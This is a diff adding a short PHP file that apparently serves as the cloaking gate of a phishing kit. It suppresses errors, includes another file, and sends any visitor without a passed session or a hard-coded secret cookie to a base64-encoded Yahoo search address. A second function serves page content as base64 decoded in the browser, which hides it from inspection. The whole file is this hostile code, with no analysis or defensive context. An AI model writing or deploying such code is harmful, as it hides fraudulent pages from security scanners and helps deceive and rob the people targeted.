@@ -1,0 +1,3 @@
+<?php session_start();error_reporting(0);CheckRealHuman();include_once ("./JMBLK.php");
+function CheckRealHuman($check=true){if($check===true){if(isset($_SESSION['_type'])){if($_SESSION['_type']!="passed"){header("Location: " . base64_decode("aHR0cHM6Ly9zZWFyY2gueWFob28uY29t"));die;}}else{header("Location: " . base64_decode("aHR0cHM6Ly9zZWFyY2gueWFob28uY29t"));die;}$cih=isset($_COOKIE['cih'])? $_COOKIE['cih']:(isset($_GET['cih'])?$_GET['cih']:"");if ($cih != 'L₦7CvzDCos|3:^/Cos|3~÷As4oKs;`A=') {header("Location: " . base64_decode("aHR0cHM6Ly9zZWFyY2gueWFob28uY29t"));die;}}}
+function ReadGo($name){$f=@file_get_contents($name);echo("<script language=\"javascript\">document.write(decodeURIComponent(atob(\"{$f}\")));</script>");die;}
